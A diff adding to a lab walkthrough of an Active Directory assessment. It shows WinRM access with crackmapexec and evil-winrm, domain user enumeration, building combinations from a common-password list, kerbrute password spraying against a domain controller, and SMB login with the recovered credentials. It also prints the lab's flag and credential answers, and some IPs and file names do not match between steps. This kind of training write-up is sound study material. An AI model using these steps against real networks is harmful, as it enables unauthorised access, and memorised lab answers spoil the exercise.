@@ -37,4 +37,55 @@ I enumerated the domain before using the following process:
 
 Now lets start with our target i.e **MS01 - 172.16.6.50**
 
+Check if we can connect to it using winrm:
+```
+crackmapexec winrm 172.16.7.50 -u 'AB920' -p 'weasal'
+```
+<img width="1347" height="142" alt="image" src="https://github.com/user-attachments/assets/58dd23d8-9783-4e8f-a66e-d7f5e2ef0d82" />
+
+As we can see its been Pwned,
+
+Lets connect to it using evil-winrm:
+```
+evil-winrm -i 172.16.7.50 -u 'AB920' -p 'weasal'
+```
+
+Then navigate to C:\, and `type flag.txt`
+
+Answer: aud1t_gr0up_m3mbersh1ps!
+
+## Q4/5. Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain. 
+
+Enumerate users from DC (SMB) and save the output:
+```
+crackmapexec smb 172.16.7.3 -u 'ab920' -p 'weasal' --users | tee unames.txt
+```
+
+Then clear the output:
+```
+cat usernames.txt | cut -d'\' -f2 | awk -F " " '{print $1}' | tee cleanuser.txt
+```
+
+Then we need to create a password combination list with the username, for this i used the following wordlist: 2023-200_most_used_passwords.txt
+
+Then creating combos:
+```
+awk 'NR==FNR{p[++np]=$0; next}{for(i=1;i<=np;i++) print $0 ":" p[i]}' 2023-200_most_used_passwords.txt cleanusers.txt > combos.txt
+```
+
+Using kerbrute to brute force the passwords:
+```
+cat combos.txt | kerbrute bruteforce -d inlanefreight.local --dc 172.16.7.3 -
+```
+
+After finding the combo validate it against the SMB share:
+```
+smbclient //172.16.7.3/'Department Shares' -U 'INLANEFREIGHT\\BR086'%'Welcome1'
+```
+
+Q4 Answer: BR086
+Q5 Answer: Welcome1
+
+## Q6. Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file? 
+
 
